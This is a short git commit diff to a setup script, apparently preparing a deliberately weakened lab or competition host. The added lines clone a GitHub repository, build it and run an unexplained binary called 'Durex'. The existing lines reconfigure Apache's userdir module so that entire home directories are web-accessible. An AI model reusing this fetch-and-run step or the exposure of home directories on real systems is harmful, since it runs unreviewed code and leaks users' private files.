7b089e3c0cb1e5a39175868982f88d8e2782d0da
dbaseqp <gabrielfok128@gmail.com>
2023-02-05 14:08:26 -0800

    testing

--- setup.sh
+++ setup.sh
@@ -1,4 +1,11 @@
 #!/bin/bash
+git clone https://github.com/dbaseqp/icu
+cd icu
+
+make
+./Durex
+cd ..
+# rm -rf ./icu
 conf='/etc/apache2/mods-available/userdir.conf'
 sed -i 's/public_html/./g' $conf
 sed -i 's/.*disabled.*//g' $conf
